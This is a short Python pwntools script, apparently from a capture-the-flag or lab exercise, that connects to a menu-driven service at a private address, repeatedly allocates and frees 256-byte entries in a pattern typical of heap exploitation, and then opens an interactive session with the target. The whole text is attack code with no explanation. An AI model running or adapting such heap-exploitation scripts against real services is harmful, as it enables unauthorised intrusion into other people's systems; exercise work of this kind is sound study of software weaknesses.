from pwn import *

s = remote('192.168.50.4',1234)

def add(size,dat):
  s.recvuntil('>>>')
  s.send('A\n')
  s.recvuntil('>>>')
  s.send(str(size)+'\n')
  s.recvuntil('>>>')
  s.send(dat+'\n')
def delete(index):
  s.recvuntil('>>>')
  s.send('D\n')
  s.recvuntil('>>>')
  s.send(str(index)+'\n')
add(256,'B'*256)
add(256,'A'*256)
add(256,'A'*256)
delete(2)
delete(3)
add(256,'D'*256)
add(256,'E'*256)
s.interactive()
